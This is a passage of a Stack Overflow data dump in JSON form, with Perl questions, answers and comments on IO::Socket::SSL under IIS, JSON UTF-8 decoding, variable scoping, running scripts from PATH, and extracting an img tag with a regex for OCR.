1533061004, "post_id": 51619298, "comment_id": 90204915, "body": "Why do you need <code>use IO::Socket::SSL</code> in your server-side script? Or even <code>use IO::Socket</code> for that matter?"}, {"owner": {"reputation": 6468, "user_id": 293652, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/820308d5db420d7f0e1d0ba97e09f520?s=128&d=identicon&r=PG", "display_name": "Grant McLean", "link": "https://stackoverflow.com/users/293652/grant-mclean"}, "edited": false, "score": 0, "creation_date": 1533064974, "post_id": 51619298, "comment_id": 90206705, "body": "Where did you install the IO::Socket::SSL library? It&#39;s possible that the directory you installed it into is not in the default library search path that processes inherit from IIS."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 3, "creation_date": 1533074884, "post_id": 51619298, "comment_id": 90210825, "body": "Is there anything relevant in your web server&#39;s log files?"}, {"owner": {"reputation": 91, "user_id": 6257069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c95927e9d4d62822dcf6fb93fc733dd0?s=128&d=identicon&r=PG&f=1", "display_name": "Alpes Maritimes", "link": "https://stackoverflow.com/users/6257069/alpes-maritimes"}, "edited": false, "score": 0, "creation_date": 1533121460, "post_id": 51619298, "comment_id": 90227481, "body": "IO::Socket::SSL is installed in &lt;perl distribution&gt;/vendor/lib directory. No problem when using IO::Socket ( installed in same directory ) so I don&#39;t think it comes from library search path. I got following error message on my browser:"}, {"owner": {"reputation": 91, "user_id": 6257069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c95927e9d4d62822dcf6fb93fc733dd0?s=128&d=identicon&r=PG&f=1", "display_name": "Alpes Maritimes", "link": "https://stackoverflow.com/users/6257069/alpes-maritimes"}, "edited": false, "score": 0, "creation_date": 1533121466, "post_id": 51619298, "comment_id": 90227484, "body": "The specified CGI application misbehaved by not returning a complete set of HTTP headers. The headers it did return are &quot;Can&#39;t load &#39;D:/strawberry-perl-5.26.1.1-64bit-portable/perl/site/lib/au&zwnj;&#8203;to/Net/SSLeay/SSLeay&zwnj;&#8203;.xs.dll&#39; for module Net::SSLeay: load_file:The specified module could not be found at D:/strawberry-perl-5.26.1.1-64bit-portable/perl/lib/DynaLoad&zwnj;&#8203;er.pm line 193. &quot;  D:/strawberry-perl-5.26.1.1-64bit-portable/perl/site/lib/aut&zwnj;&#8203;o/Net/SSLeay/SSLeay.&zwnj;&#8203;xs.dll"}], "answers": [{"tags": [], "owner": {"reputation": 91, "user_id": 6257069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c95927e9d4d62822dcf6fb93fc733dd0?s=128&d=identicon&r=PG&f=1", "display_name": "Alpes Maritimes", "link": "https://stackoverflow.com/users/6257069/alpes-maritimes"}, "is_accepted": false, "score": 0, "last_activity_date": 1533138786, "creation_date": 1533138786, "answer_id": 51637583, "question_id": 51619298, "link": "https://stackoverflow.com/questions/51619298/iosocketssl-fails-with-iis-8-5/51637583#51637583", "title": "IO::Socket::SSL fails with IIS 8.5", "body": "<p>I added directory containing libcrypto-1_1-x64__.dll file into system PATH and rebooted the machine. It solved my issue.</p>\n"}], "owner": {"reputation": 91, "user_id": 6257069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c95927e9d4d62822dcf6fb93fc733dd0?s=128&d=identicon&r=PG&f=1", "display_name": "Alpes Maritimes", "link": "https://stackoverflow.com/users/6257069/alpes-maritimes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 114, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1533138786, "creation_date": 1533059522, "question_id": 51619298, "link": "https://stackoverflow.com/questions/51619298/iosocketssl-fails-with-iis-8-5", "title": "IO::Socket::SSL fails with IIS 8.5", "body": "<p>Following script runs successfully when run with Perl CLI ( Windows). But when run through IIS 8.5, it fails.</p>\n\n<pre><code>use IO::Socket::SSL;\n\nprint &lt;&lt;EOP;\nContent-type: text/html\n\n&lt;html&gt;&lt;body&gt;\n&lt;h1&gt;Hello world&lt;/h1&gt;\nEOP\n\nprint \"&lt;/body&gt;&lt;/html&gt;\\n\";\n</code></pre>\n\n<p>Error message is </p>\n\n<blockquote>\n  <p>502 - Web server received an invalid response while acting as a\n  gateway or proxy server.</p>\n</blockquote>\n\n<p>When \"use IO::Socket::SSL\" line is deleted, it is successfully executed.\nWith \"use IO::Socket\", it is too successfully executed.</p>\n\n<p>Is there something wrong with my IIS / CGI configuration?</p>\n\n<p>Thank you for your help.</p>\n"}, {"tags": ["postgresql", "perl", "dbi", "mojolicious"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1533062670, "post_id": 51619258, "comment_id": 90205692, "body": "Those don&#39;t look like encoded characters to me: if they were encoded you wouldn&#39;t be able to read them! Use <code>from_json</code> instead. And don&#39;t use <code>Devel::Peek</code> if you have to guess what the output means: the internal encoding that perl uses to represent strings is of no consequence."}, {"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533063041, "post_id": 51619258, "comment_id": 90205871, "body": "@Borodin: ah, I should use <code>decode_json</code> only on bytestream"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1533065689, "last_edit_date": 1533065689, "creation_date": 1533065082, "answer_id": 51620665, "question_id": 51619258, "link": "https://stackoverflow.com/questions/51619258/input-is-not-utf-8-encoded/51620665#51620665", "title": "Input is not UTF-8 encoded", "body": "<p>The first 5 characters of your string are the following (in hex):</p>\n\n<pre><code>5B 22 41D 434 22\n</code></pre>\n\n<p>Character encodings such as UTF-8 are means of representing code points using bytes, and two of those characters aren't bytes, so your string can't possibly be JSON encoded using UTF-8.</p>\n\n<p>It appears that you have a decoded string. The character encoding has already been removed to produce a string of Unicode Code Points. If that's what you have, replace</p>\n\n<pre><code>JSON::decode_json($json_utf8)\nJSON::MaybeXS::decode_json($json_utf8)\nJSON::PP::decode_json($json_utf8)\nJSON::XS::decode_json($json_utf8)\nCpanel::JSON::XS::decode_json($json_utf8)\n</code></pre>\n\n<p>with</p>\n\n<pre><code>JSON-&gt;new-&gt;decode($json_ucp)    -or-    JSON::from_json($json_ucp)\nJSON::MaybeXS-&gt;new-&gt;decode($json_ucp)\nJSON::PP-&gt;new-&gt;decode($json_ucp)\nJSON::XS-&gt;new-&gt;decode($json_ucp)\nCpanel::JSON::XS-&gt;new-&gt;decode($json_ucp)\n</code></pre>\n\n<hr>\n\n<p>By the way, unless you want to look at Perl internals, Devel::Peek isn't the right tool for the job. You should be using Data::Dumper or similar instead.</p>\n\n<pre><code>use Data::Dumper qw( Dumper );\n# This is the same string as in the OP.\nmy $value = qq{[\"\\x{41d}\\x{434}\", \"\\x{41f}\\x{43d}\", \"\\x{412}\\x{442}\", \"\\x{421}\\x{440}\", \"\\x{427}\\x{442}\", \"\\x{41f}\\x{442}\", \"\\x{421}\\x{431}\"]};\nlocal $Data::Dumper::Useqq = 1;\nprint(Dumper($value));\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$VAR1 = \"[\\\"\\x{41d}\\x{434}\\\", \\\"\\x{41f}\\x{43d}\\\", \\\"\\x{412}\\x{442}\\\", \\\"\\x{421}\\x{440}\\\", \\\"\\x{427}\\x{442}\\\", \\\"\\x{41f}\\x{442}\\\", \\\"\\x{421}\\x{431}\\\"]\";\n</code></pre>\n"}], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 875, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1533065689, "creation_date": 1533059312, "question_id": 51619258, "link": "https://stackoverflow.com/questions/51619258/input-is-not-utf-8-encoded", "title": "Input is not UTF-8 encoded", "body": "<p>my database is <code>utf8</code> aware:</p>\n\n<pre><code>                                   List of databases\n   Name    |     Owner     | Encoding |  Collate   |   Ctype    |\n-----------+---------------+----------+------------+------------+\n tucha     | tucha_cleaner | UTF8     | en_US.utf8 | en_US.utf8 | \n</code></pre>\n\n<p>When I connect to it I set <code>client_encoding</code>:</p>\n\n<pre><code>my $hm_schema = App::Schema-&gt;connect( $dsn, $user, $pass, {\n        AutoCommit =&gt; 1,\n        RaiseError =&gt; 1,\n        client_encoding =&gt; 'UTF8',\n    }\n);\n</code></pre>\n\n<p>The returned value, as far as I can see, is UTF8:</p>\n\n<pre><code>DBG&gt;$value\n[\"\u041d\u0434\", \"\u041f\u043d\", \"\u0412\u0442\", \"\u0421\u0440\", \"\u0427\u0442\", \"\u041f\u0442\", \"\u0421\u0431\"]\n\nDBG&gt;use Devel::Peek\n\nDBG&gt;Devel::Peek::Dump $value\nSV = PVMG(0xfe41c20) at 0xfe079b0\n  REFCNT = 1\n  FLAGS = (POK,IsCOW,pPOK,UTF8)\n  IV = 0\n  NV = 0\n  PV = 0xfe27550 \"[\\\"\\320\\235\\320\\264\\\", \\\"\\320\\237\\320\\275\\\", \\\"\\320\\222\\321\\202\\\", \\\"\\320\\241\\321\\200\\\", \\\"\\320\\247\\321\\202\\\", \\\"\\320\\237\\321\\202\\\", \\\"\\320\\241\\320\\261\\\"]\"\\0 [UTF8 \"[\"\\x{41d}\\x{434}\", \"\\x{41f}\\x{43d}\", \"\\x{412}\\x{442}\", \"\\x{421}\\x{440}\", \"\\x{427}\\x{442}\", \"\\x{41f}\\x{442}\", \"\\x{421}\\x{431}\"]\"]\n  CUR = 56\n  LEN = 58\n  COW_REFCNT = 4\nundef\n</code></pre>\n\n<p>But when I try to decode that string by <code>decode_json</code> from <code>Mojo::JSON</code> I get the error:</p>\n\n<pre><code>DBG&gt; decode_json $value\nERROR: Input is not UTF-8 encoded at ...\n</code></pre>\n\n<p>Why I get that error and how to fix it?</p>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 2, "creation_date": 1533061492, "post_id": 51619200, "comment_id": 90205177, "body": "In addition to what Dave Cross has noted, <code>$skip</code> will start at the 88th &#39;paragraph&#39;, not the 88th line. <code>@lines</code> should probably be split into with <code>my @lines = split &#47;\\n&#47;</code> (only 1 newline)."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533063280, "post_id": 51619362, "comment_id": 90205981, "body": "Line 14 isn&#39;t in that code: there&#39;s no <i>&quot;concatenation (.) or string&quot;</i> involving <code>$skip</code> anywhere there."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1533064032, "post_id": 51619362, "comment_id": 90206300, "body": "@Borodin: My guess is that this isn&#39;t the real code and the real code has  <code>next unless &quot;$skip&quot; .. undef</code> as line 14. Just a guess though."}, {"owner": {"reputation": 91, "user_id": 10033194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4cde3f9ea294cca4f0d23b1ed2a041e7?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Anowez", "link": "https://stackoverflow.com/users/10033194/thomas-anowez"}, "edited": false, "score": 0, "creation_date": 1533109289, "post_id": 51619362, "comment_id": 90220128, "body": "Yes, in the head of script I have #!/usr/bin/perl and more comment, so, $skip declaration is at 14th row"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 91, "user_id": 10033194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4cde3f9ea294cca4f0d23b1ed2a041e7?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Anowez", "link": "https://stackoverflow.com/users/10033194/thomas-anowez"}, "edited": false, "score": 0, "creation_date": 1533109631, "post_id": 51619362, "comment_id": 90220297, "body": "@ThomasAnowez: And you didn&#39;t think that information would be useful to us in your original question?"}, {"owner": {"reputation": 91, "user_id": 10033194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4cde3f9ea294cca4f0d23b1ed2a041e7?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Anowez", "link": "https://stackoverflow.com/users/10033194/thomas-anowez"}, "edited": false, "score": 0, "creation_date": 1533117332, "post_id": 51619362, "comment_id": 90224882, "body": "I&#39;ve exclude only the comments about exercise :("}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 91, "user_id": 10033194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4cde3f9ea294cca4f0d23b1ed2a041e7?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Anowez", "link": "https://stackoverflow.com/users/10033194/thomas-anowez"}, "edited": false, "score": 0, "creation_date": 1533118020, "post_id": 51619362, "comment_id": 90225346, "body": "@ThomasAnowez: Yes, but if your error message mentions line 14 and you have removed some code (even if it&#39;s only comments) then we have no way of knowing which is line 14. That is vital information that you should have given us. Perhaps a comment saying <code># this is line 14</code> at the relevant point in your code."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 3, "last_activity_date": 1533059722, "creation_date": 1533059722, "answer_id": 51619362, "question_id": 51619200, "link": "https://stackoverflow.com/questions/51619200/insert-array-value-into-scalar-perl/51619362#51619362", "title": "Insert array value into $scalar - Perl", "body": "<p>I can see a couple of obvious errors here.</p>\n\n<p>You declare <code>$skip</code> in a block that immediately ends.</p>\n\n<pre><code>if ( $file_input eq $filename[$i] ) {\n    my $skip = $nrows[$i];\n}\n</code></pre>\n\n<p>So you can never see the value of <code>$skip</code>.</p>\n\n<p>Then, when you're trying to access <code>$skip</code>, you put it in single quotes. And variables don't expand in single quotes, so Perl just sees it as the five characters <code>$</code>, <code>s</code>, <code>k</code>, <code>i</code> and <code>p</code>.</p>\n\n<p>But I don't think either of those explain the error you're seeing. Which line in your sample code is line 14.</p>\n\n<p>It's far more useful to us if you give us a code sample that we can run.</p>\n\n<p>I'd suggest an alternative approach, but I'm afraid it's really not clear what you're trying to do.</p>\n"}, {"tags": [], "owner": {"reputation": 1228, "user_id": 4709524, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/wGrTV.jpg?s=128&g=1", "display_name": "beasy", "link": "https://stackoverflow.com/users/4709524/beasy"}, "is_accepted": false, "score": 1, "last_activity_date": 1533064085, "last_edit_date": 1533064085, "creation_date": 1533062444, "answer_id": 51620049, "question_id": 51619200, "link": "https://stackoverflow.com/questions/51619200/insert-array-value-into-scalar-perl/51620049#51620049", "title": "Insert array value into $scalar - Perl", "body": "<p>The error you're getting is because in your code, you're trying to use <code>$skip</code> outside the scope it was declared in. </p>\n\n<p>But on a broader level, It seems like you just want to skip a certain number of lines depending on the filename. You should use a hash for that instead of parallel arrays.</p>\n\n<pre><code>use strict;    \n\nmy %lines_to_skip = (\n    'a.txt' =&gt; 88,\n    'b.txt' =&gt; 64\n);\n\nfor my $file (glob(\"*.txt\")) {\n    my $skip = $lines_to_skip{$file};\n    open my $fh, '&lt;', $file;\n    # local $/ = \"\\n\\n\"; # note that this would read the file in paragraph mode\n    while (&lt;$fh&gt;) {\n         next unless $. &gt; $skip;\n         # do something\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 91, "user_id": 10033194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4cde3f9ea294cca4f0d23b1ed2a041e7?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Anowez", "link": "https://stackoverflow.com/users/10033194/thomas-anowez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 133, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1533126655, "creation_date": 1533059100, "last_edit_date": 1533126655, "question_id": 51619200, "link": "https://stackoverflow.com/questions/51619200/insert-array-value-into-scalar-perl", "title": "Insert array value into $scalar - Perl", "body": "<p>How could i assign a specific array value into $skip?\nI would start to read from a.txt or b.txt from a specific line (88 for a.txt and 64 for b.txt)</p>\n\n<pre><code>#!/usr/bin/perl\n# Libraries\nuse strict;\nuse warnings;\n\n# Main script\nmy @filename = ('a.txt', 'b.txt');\nmy @nrows = ('88', '64');\n\nforeach my $file_input(glob(\"*.txt\")) {\n    open my $fh, '&lt;', $file_input or die \"can't read open $IN_FILE\";\n    for my $i (0 .. $#nrows) {\n        if ( $file_input eq $filename[$i] ) {\n            my $skip = $nrows[$i];\n        }\n    }\n    $/ = \"\\n\\n\";  # record separator\n    while( &lt;$fh&gt; ) {\n    next unless '$skip' .. undef;\n    my @lines = split /\\n\\n/;\n    **... some manipulations ...**\n}\nclose ($fh);\n}\n</code></pre>\n\n<p>I Receive following error:</p>\n\n<pre><code>Use of uninitialized value $skip in concatenation (.) or string at ./exercise.n24.pl line 14, &lt;$fh&gt; chunk 11.\n</code></pre>\n\n<p>I've made a lot of test in last 4 hours, and I don't understand where I'm wrong</p>\n"}, {"tags": ["perl", "path", "directory"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1533053657, "last_edit_date": 1533053657, "creation_date": 1533052798, "answer_id": 51617588, "question_id": 51617522, "link": "https://stackoverflow.com/questions/51617522/how-can-i-simply-use-one-perl-script-in-any-folder/51617588#51617588", "title": "How can I simply use one perl script in any folder?", "body": "<p>While the system is using <code>PATH</code> to find the program to run, the system is executing <code>perl</code>, not <code>script.pl</code>. </p>\n\n<p>Either tell <code>perl</code> to search <code>PATH</code> for the script,</p>\n\n<pre><code>perl -S script.pl SOME ARGUMENTS\n</code></pre>\n\n<p>Or launch the script directly.</p>\n\n<pre><code>script.pl SOME ARGUMENTS\n</code></pre>\n\n<p>Windows will use file associations to determine how to launch the file in the latter case.</p>\n"}], "owner": {"reputation": 711, "user_id": 8998596, "user_type": "registered", "profile_image": "https://graph.facebook.com/10210068954830186/picture?type=large", "display_name": "Martin Melichar", "link": "https://stackoverflow.com/users/8998596/martin-melichar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1533053657, "creation_date": 1533052556, "question_id": 51617522, "link": "https://stackoverflow.com/questions/51617522/how-can-i-simply-use-one-perl-script-in-any-folder", "title": "How can I simply use one perl script in any folder?", "body": "<p>I have just added this script to PATH variable, but it does not work.</p>\n\n<p>I need to use it in any directory as:</p>\n\n<pre><code>perl script.pl SOME ARGUMENTS\n</code></pre>\n\n<p>I have windows 7 Ultimate.</p>\n\n<p>Thank you for advices!</p>\n"}, {"tags": ["html", "regex", "perl", "parsing"], "answers": [{"comments": [{"owner": {"reputation": 1781, "user_id": 807650, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5c8db490df81736445eee4097def2bc9?s=128&d=identicon&r=PG", "display_name": "jja", "link": "https://stackoverflow.com/users/807650/jja"}, "edited": false, "score": 0, "creation_date": 1533052043, "post_id": 51616182, "comment_id": 90200239, "body": "The non-greedy version of <code>.*</code> is not <code>.?</code> but <code>.*?</code>. <code>.?</code> will match a single character that may not be there."}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 1781, "user_id": 807650, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5c8db490df81736445eee4097def2bc9?s=128&d=identicon&r=PG", "display_name": "jja", "link": "https://stackoverflow.com/users/807650/jja"}, "edited": false, "score": 0, "creation_date": 1533052255, "post_id": 51616182, "comment_id": 90200372, "body": "@jja My answer is correct, but the *&#39;s are being stripped out by the formatting and used to emphasis bits of it instead :/ I guess I&#39;ll need to work out how to fix that"}, {"owner": {"reputation": 1781, "user_id": 807650, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5c8db490df81736445eee4097def2bc9?s=128&d=identicon&r=PG", "display_name": "jja", "link": "https://stackoverflow.com/users/807650/jja"}, "edited": false, "score": 0, "creation_date": 1533052385, "post_id": 51616182, "comment_id": 90200434, "body": "I thought something was off with the formatting. :) Try wrapping them in &quot;`&quot; so they don&#39;t get interpreted as formatting characters"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 1781, "user_id": 807650, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5c8db490df81736445eee4097def2bc9?s=128&d=identicon&r=PG", "display_name": "jja", "link": "https://stackoverflow.com/users/807650/jja"}, "edited": false, "score": 0, "creation_date": 1533052454, "post_id": 51616182, "comment_id": 90200484, "body": "@jja I&#39;ve opted for escaping them as that seems to work too"}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 0, "creation_date": 1533053067, "post_id": 51616182, "comment_id": 90200898, "body": "@Chris Turner you did a very nice explanation, thanks. In output I see that ($img = &#39;GET /captcha/1533049803.png&#39;). That $img Tesseract don`t recognize. Maybe I need &#39;GET 1533049803.png&#39; instead of &#39;GET /captcha/1533049803.png&#39;. Can you give me a regular expression to do this? I am trying to edit your regular expression to achieve this, but did not succeed"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 1, "creation_date": 1533053607, "post_id": 51616182, "comment_id": 90201223, "body": "@Oysiyl That is the exact opposite of your problem, you want to specify more of the URL, not less. You want to do (GET &#39;http ://perltest.adavice.com/captcha/1533049803.png&#39;)"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1533053708, "post_id": 51616182, "comment_id": 90201262, "body": "(except without a space after &quot;http&quot; as that is just me trying to stop it from treating it like an actual URL in my comment)"}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 0, "creation_date": 1533053904, "post_id": 51616182, "comment_id": 90201365, "body": "@Chris Turner yes! I want do this but don`t understand how to add text(&#39;http:/perltest.adavice.com&#39;) to my $img(/captcha/1533049803.png). I am tried to concatenate $url and $img but this dont work as I expected"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1533054337, "post_id": 51616182, "comment_id": 90201582, "body": "You&#39;ve got <code>system &quot;GET &#39;$img&#39; &gt; ocr_me.img&quot;;</code> so make it <code>system &quot;GET &#39;$home$img&#39; &gt; ocr_me.img&quot;;</code>"}, {"owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "edited": false, "score": 0, "creation_date": 1533056839, "post_id": 51616182, "comment_id": 90202845, "body": "@Chris Turner, yep programm correctly load image. But Tesseract dont recognize anything(GET &#39;&#39; &gt; ocr_result.txt. Captcha text dont specified). In any case, the answer to the question is received. Probably, I will look for more information about Tesseract. If I can not cope with the error, I will ask a new question on site. Thanks for your help"}], "tags": [], "owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "is_accepted": true, "score": 4, "last_activity_date": 1533052368, "last_edit_date": 1533052368, "creation_date": 1533048393, "answer_id": 51616182, "question_id": 51615451, "link": "https://stackoverflow.com/questions/51615451/use-regular-expression-to-extract-img-tag-from-html-in-perl/51616182#51616182", "title": "Use regular expression to extract img tag from HTML in Perl", "body": "<p>Aside from the fact that using regular expressions on HTML isn't very reliable, your regular expression in the following code isn't going to work because it's missing a capture group, so <code>$1</code> won't be assigned a value.</p>\n\n<pre><code>if ($html =~ /&lt;img. *?src. *?&gt;/)\n{\n    $img = $1;\n}\n</code></pre>\n\n<p>If you want to extract parts of text using a regular expression you need to put that part inside brackets. Like for example:</p>\n\n<pre><code>$example = \"hello world\";\n$example =~ /(hello) world/;\n</code></pre>\n\n<p>this will set $1 to \"hello\".</p>\n\n<p>The regular expression itself doesn't make that much sense - where you have \". *?\", that'll match any character followed by 0 or more spaces. Is that a typo for \".*?\" which would match any number of characters but isn't greedy like \".*\", so will stop when it finds a match for the next part of the regex.</p>\n\n<p>This regular expression is possibly closer to what you're looking for. It'll match the first img tag that has a src attribute that starts with \"/captcha/\" and store the image URL in <code>$1</code></p>\n\n<pre><code>$html =~ m%&lt;img[^&gt;]*src=\"(/captcha/[^\"]*)\"%s;\n</code></pre>\n\n<p>To break it down how it works. The \"m%....%\" is just a different way of saying \"/.../\" that allows you to put slashes in the regex without needing to escape them. \"[^>]*\" will match zero or more of any character except \">\" - so it won't match the end of the tag. And 